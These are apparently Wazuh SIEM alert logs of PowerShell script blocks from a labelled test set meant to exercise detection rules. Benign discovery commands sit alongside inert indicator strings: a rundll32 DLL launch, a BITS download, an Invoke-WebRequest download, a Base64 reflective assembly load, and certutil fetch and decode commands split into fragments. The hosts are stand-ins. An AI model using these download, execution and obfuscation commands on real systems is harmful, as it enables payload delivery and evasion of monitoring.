{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"29338b00-762e-429d-99eb-50dfeb0b3950","scriptBlockText":"$sampleId='PST-171'; $indicator='rundll3' + '2.e' + 'xe C:\\\\__T' + 'HESIS_I' + 'NERT__\\\\st' + 'age.dll' + ',EntryP' + 'oint'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722984","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-171'; $indicator='rundll3' + '2.e' + 'xe C:\\__T' + 'HESIS_I' + 'NERT__\\st' + 'age.dll' + ',EntryP' + 'oint'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 29338b00-762e-429d-99eb-50dfeb0b3950\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:51.5193879Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:51.5193879Z\",\"eventRecordID\":\"722984\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-171'; $indicator='rundll3' + '2.e' + 'xe C:\\\\__T' + 'HESIS_I' + 'NERT__\\\\st' + 'age.dll' + ',EntryP' + 'oint'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 29338b00-762e-429d-99eb-50dfeb0b3950\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-171'; $indicator='rundll3' + '2.e' + 'xe C:\\\\\\\\__T' + 'HESIS_I' + 'NERT__\\\\\\\\st' + 'age.dll' + ',EntryP' + 'oint'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"29338b00-762e-429d-99eb-50dfeb0b3950\"}}}","id":"1784281011.518639","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:51.794+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b840c6c6-784b-456b-a1f5-73cb283ff964","scriptBlockText":"$sampleId='PST-172'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722988","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-172'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b840c6c6-784b-456b-a1f5-73cb283ff964\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:51.8516218Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:51.8516218Z\",\"eventRecordID\":\"722988\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-172'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b840c6c6-784b-456b-a1f5-73cb283ff964\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-172'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b840c6c6-784b-456b-a1f5-73cb283ff964\"}}}","id":"1784281012.522182","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":17,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:52.812+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0d8b5649-b1f2-474e-8170-aa06d6c4b2a0","scriptBlockText":"$sampleId='PST-173'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722991","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-173'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0d8b5649-b1f2-474e-8170-aa06d6c4b2a0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:52.1765408Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:52.1765408Z\",\"eventRecordID\":\"722991\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-173'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0d8b5649-b1f2-474e-8170-aa06d6c4b2a0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-173'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0d8b5649-b1f2-474e-8170-aa06d6c4b2a0\"}}}","id":"1784281012.522182","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:52.817+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3ee6269b-2da9-46e2-bf8c-03a14c87c1e7","scriptBlockText":"$sampleId='PST-174'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723006","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-174'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3ee6269b-2da9-46e2-bf8c-03a14c87c1e7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:52.5745130Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:52.5745130Z\",\"eventRecordID\":\"723006\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-174'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3ee6269b-2da9-46e2-bf8c-03a14c87c1e7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-174'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3ee6269b-2da9-46e2-bf8c-03a14c87c1e7\"}}}","id":"1784281012.522182","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:52.853+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b45007b9-ebea-4f74-b2ec-2334917603b9","scriptBlockText":"$sampleId='PST-175'; $indicator='Start-BitsTransfer -Source ''https://bits.example.invalid/payload.bin'' -Destination ''$env:TEMP\\\\cache.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723008","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-175'; $indicator='Start-BitsTransfer -Source ''https://bits.example.invalid/payload.bin'' -Destination ''$env:TEMP\\cache.bin'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b45007b9-ebea-4f74-b2ec-2334917603b9\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:52.9143022Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:52.9143022Z\",\"eventRecordID\":\"723008\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-175'; $indicator='Start-BitsTransfer -Source ''https://bits.example.invalid/payload.bin'' -Destination ''$env:TEMP\\\\cache.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b45007b9-ebea-4f74-b2ec-2334917603b9\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-175'; $indicator='Start-BitsTransfer -Source ''https://bits.example.invalid/payload.bin'' -Destination ''$env:TEMP\\\\\\\\cache.bin'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b45007b9-ebea-4f74-b2ec-2334917603b9\"}}}","id":"1784281013.522182","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":18,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:53.848+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d5620b7f-bf48-4101-ac58-014e2b91cc48","scriptBlockText":"$sampleId='PST-176'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723009","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-176'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d5620b7f-bf48-4101-ac58-014e2b91cc48\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:53.2449450Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:53.2449450Z\",\"eventRecordID\":\"723009\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-176'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d5620b7f-bf48-4101-ac58-014e2b91cc48\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-176'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d5620b7f-bf48-4101-ac58-014e2b91cc48\"}}}","id":"1784281013.527207","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":7,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:36:53.850+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0b1ffff2-2762-4351-b021-722883d466ba","scriptBlockText":"$sampleId='PST-177'; $indicator='InvokE-wEbrEquEsT -uRi ''HtTPs://FILes.examPlE.invAlid/UpdATe.BiN'' -oUTFiLE ''$ENv:temp\\\\UpdATe.BIN'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723013","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-177'; $indicator='InvokE-wEbrEquEsT -uRi ''HtTPs://FILes.examPlE.invAlid/UpdATe.BiN'' -oUTFiLE ''$ENv:temp\\UpdATe.BIN'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0b1ffff2-2762-4351-b021-722883d466ba\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:53.5753489Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:53.5753489Z\",\"eventRecordID\":\"723013\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-177'; $indicator='InvokE-wEbrEquEsT -uRi ''HtTPs://FILes.examPlE.invAlid/UpdATe.BiN'' -oUTFiLE ''$ENv:temp\\\\UpdATe.BIN'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0b1ffff2-2762-4351-b021-722883d466ba\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-177'; $indicator='InvokE-wEbrEquEsT -uRi ''HtTPs://FILes.examPlE.invAlid/UpdATe.BiN'' -oUTFiLE ''$ENv:temp\\\\\\\\UpdATe.BIN'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0b1ffff2-2762-4351-b021-722883d466ba\"}}}","id":"1784281013.529446","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":19,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:53.858+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"dbf493e7-2156-493a-81bf-7cc1a864b743","scriptBlockText":"$sampleId='PST-178'; $indicator='[Reflection.Assembly]::Load([Convert]::FromBase64String(''VEhFU0lTLUlORVJULURVTU1Z''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723018","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-178'; $indicator='[Reflection.Assembly]::Load([Convert]::FromBase64String(''VEhFU0lTLUlORVJULURVTU1Z''))'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: dbf493e7-2156-493a-81bf-7cc1a864b743\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:53.9019188Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:53.9019188Z\",\"eventRecordID\":\"723018\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-178'; $indicator='[Reflection.Assembly]::Load([Convert]::FromBase64String(''VEhFU0lTLUlORVJULURVTU1Z''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: dbf493e7-2156-493a-81bf-7cc1a864b743\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-178'; $indicator='[Reflection.Assembly]::Load([Convert]::FromBase64String(''VEhFU0lTLUlORVJULURVTU1Z''))'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"dbf493e7-2156-493a-81bf-7cc1a864b743\"}}}","id":"1784281014.531943","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":17,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:54.907+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fb1e8b95-0c37-4158-84f5-c43cdf510755","scriptBlockText":"$sampleId='PST-179'; $parts=@('CErtUTiL.exe -Url`','cache -sPlIt -f Ht','tPs://CERt.EXA`mp','lE.IN`valID/bl','ob.Txt c:\\\\_','_THesIs_iNErT_','_\\\\BLOb.txT; CER','TutiL.exe -D','EC`ODE C:\\\\__tHEs`IS','_iNeRT__\\\\BlOb.tXT C',':\\\\__tHeS`IS_inEr','t__\\\\stage.bi','n'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723019","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-179'; $parts=@('CErtUTiL.exe -Url`','cache -sPlIt -f Ht','tPs://CERt.EXA`mp','lE.IN`valID/bl','ob.Txt c:\\_','_THesIs_iNErT_','_\\BLOb.txT; CER','TutiL.exe -D','EC`ODE C:\\__tHEs`IS','_iNeRT__\\BlOb.tXT C',':\\__tHeS`IS_inEr','t__\\stage.bi','n'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fb1e8b95-0c37-4158-84f5-c43cdf510755\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:54.2346579Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:54.2346579Z\",\"eventRecordID\":\"723019\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-179'; $parts=@('CErtUTiL.exe -Url`','cache -sPlIt -f Ht','tPs://CERt.EXA`mp','lE.IN`valID/bl','ob.Txt c:\\\\_','_THesIs_iNErT_','_\\\\BLOb.txT; CER','TutiL.exe -D','EC`ODE C:\\\\__tHEs`IS','_iNeRT__\\\\BlOb.tXT C',':\\\\__tHeS`IS_inEr','t__\\\\stage.bi','n'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fb1e8b95-0c37-4158-84f5-c43cdf510755\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-179'; $parts=@('CErtUTiL.exe -Url`','cache -sPlIt -f Ht','tPs://CERt.EXA`mp','lE.IN`valID/bl','ob.Txt c:\\\\\\\\_','_THesIs_iNErT_','_\\\\\\\\BLOb.txT; CER','TutiL.exe -D','EC`ODE C:\\\\\\\\__tHEs`IS','_iNeRT__\\\\\\\\BlOb.tXT C',':\\\\\\\\__tHeS`IS_inEr','t__\\\\\\\\stage.bi','n'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fb1e8b95-0c37-4158-84f5-c43cdf510755\"}}}","id":"1784281014.531943","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:54.910+0200"}
